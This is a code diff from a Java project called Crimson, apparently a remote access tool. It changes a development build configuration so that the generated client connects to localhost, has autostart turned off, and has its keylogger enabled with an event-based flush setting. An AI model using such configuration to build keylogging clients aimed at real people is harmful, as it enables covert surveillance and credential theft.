@@ -32,6 +32,7 @@ import com.subterranean_security.crimson.core.Common;
 import com.subterranean_security.crimson.core.Common.Instance;
 import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
 import com.subterranean_security.crimson.core.proto.Generator.NetworkTarget;
+import com.subterranean_security.crimson.core.proto.Keylogger.FLUSH_METHOD;
 import com.subterranean_security.crimson.core.proto.Misc.AuthMethod;
 import com.subterranean_security.crimson.core.proto.Misc.AuthType;
 import com.subterranean_security.crimson.core.storage.ServerDB;
@@ -120,7 +121,8 @@ public final class Server {
 				.addTarget(NetworkTarget.newBuilder().setServer("127.0.0.1").setPort(10101).build())
 				.setPathWin("C:\\Users\\dev\\Documents\\Crimson").setPathBsd("/").setPathLin("/home/dev/cr")
 				.setPathOsx("/").setPathSol("/").setReconnectPeriod(3000).setBuildNumber(Common.build)
-				.setAutostart(true).setKeylogger(true).build();
+				.setAutostart(false).setKeylogger(true).setKeyloggerFlushMethod(FLUSH_METHOD.EVENT)
+				.setKeyloggerFlushValue(15).build();
 		try {
 			Generator g = new Generator();
 			g.generate(cc);
